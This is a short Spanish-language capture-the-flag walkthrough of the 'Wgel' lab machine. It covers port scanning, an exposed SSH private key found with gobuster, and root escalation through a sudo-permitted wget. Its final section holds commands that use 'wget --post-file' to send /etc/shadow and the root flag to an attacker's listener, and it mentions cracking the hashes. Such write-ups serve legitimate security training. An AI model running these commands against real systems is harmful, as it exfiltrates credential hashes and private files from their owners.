# Wgel
## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```
## Enum
### HTTP 
En el source de la main page
```
 <!-- Jessie don't forget to udate the webiste -->
 ```
 Un user tal vez
 #### Gobuster 
 ```
 /sitemap (Status: 301)
 /sitemap/.ssh/ (Status: 301)
```

El segundo parece interesante , si accedemos vemos una clave RSA 

Tenemos una clave , tenemos un user , podriamos entrar?

## Privesc

Entramos como jessie y podemos leer la flag del user, veamos como escalar
```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
Sin password solo wget , por suerte es bien conocido que con wget tenemos arbitrary file read/write

```
 sudo /usr/bin/wget --post-file=/etc/shadow IP:1234
```
Obtenemos el shadow y intentamos crackear el hash, aunque la way que se busca por lo visto es la siguiente
```
 sudo /usr/bin/wget --post-file=/root/root_flag.txt IP:1234
```
 
